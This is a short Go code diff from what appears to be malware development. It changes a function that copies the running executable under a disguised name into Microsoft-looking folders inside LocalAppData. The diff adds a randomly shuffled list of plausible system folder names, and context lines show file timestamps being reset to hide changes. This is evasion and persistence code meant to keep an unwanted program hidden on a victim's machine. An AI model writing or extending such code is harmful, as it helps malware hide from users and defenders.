@@ -75,12 +75,22 @@ func touchTimestamps(targetPath string) {
 	_ = os.Chtimes(targetPath, info.ModTime(), info.ModTime())
 }
 
+func getDisguiseCandidates() []string {
+	return []string{
+		"SystemAppData",
+		"CloudStore",
+		"IdentityService",
+		"DeviceMetadataStore",
+	}
+}
+
 func tryDisguiseCopy(exePath string) (string, bool) {
 	localApp := os.Getenv(getLocalAppDataEnv())
 	msDir := getMicrosoftDirName()
 	exeName := getDisguisedExeName()
 
-	dirs := getDisguiseDirList()
+	dirs := getDisguiseCandidates()
+	rand.Seed(time.Now().UnixNano())
 	rand.Shuffle(len(dirs), func(i, j int) { dirs[i], dirs[j] = dirs[j], dirs[i] })
 
 	for _, d := range dirs {
